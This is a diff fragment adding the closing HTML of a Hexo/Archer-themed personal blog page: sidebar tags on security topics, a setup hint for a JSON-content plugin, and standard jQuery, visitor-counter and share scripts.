+        <span class="sidebar-tag-name" data-tags="前端安全"><span class="iconfont-archer">&#xe606;</span>前端安全</span>
+    
+        <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
+    
+        <span class="sidebar-tag-name" data-tags="服务器"><span class="iconfont-archer">&#xe606;</span>服务器</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pentest"><span class="iconfont-archer">&#xe606;</span>Pentest</span>
+    
+        <span class="sidebar-tag-name" data-tags="Writeup SQL注入"><span class="iconfont-archer">&#xe606;</span>Writeup SQL注入</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "N0rth3ty"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
